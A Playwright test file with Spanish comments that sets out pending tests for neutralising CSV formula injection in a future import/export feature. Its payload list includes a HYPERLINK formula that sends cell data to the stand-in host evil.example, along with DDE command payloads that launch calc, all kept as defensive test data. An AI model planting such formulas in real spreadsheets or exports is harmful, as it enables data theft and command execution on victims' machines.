import { test } from '@playwright/test';

// S-04 · categoría 3: inyección de fórmulas en CSV. La importación CSV llega con
// M-04 y la exportación (si existe) con V-0x; hoy no hay UI ni código que
// probar en main. Queda como pendiente explícito (test.fixme, no omisión
// silenciosa) asignado a M-04: al llegar la importación, quitar fixme y
// completar con la carga real.
//
// Criterio a verificar:
// - Celdas que empiezan por = + - @ \t \r (p. ej. =HYPERLINK("https://evil.example","x"),
//   +cmd|' /C calc'!A0, @SUM(1), -1+1) se rechazan o se guardan neutralizadas
//   (prefijo ') y al exportar nunca salen como fórmula.
// - Tipos inválidos, filas que apuntan a otra unidad o a un indicador no
//   asignado se rechazan (RLS + validación) con un error legible y sin
//   aplicar filas parciales.
// - Tamaño máximo y codificaciones raras (UTF-16, BOM, NUL) no rompen la vista.

const FORMULAS = [
  '=HYPERLINK("https://evil.example/?d="&A1,"ver")',
  "+cmd|' /C calc'!A0",
  '@SUM(1+1)*cmd|" /C calc"!A0',
  '-2+3+cmd|" /C calc"!A0',
  '\t=1+1',
];

for (const f of FORMULAS) {
  test.fixme(`CSV (M-04): la fórmula ${JSON.stringify(f)} se neutraliza en importación y exportación`, async () => {});
}
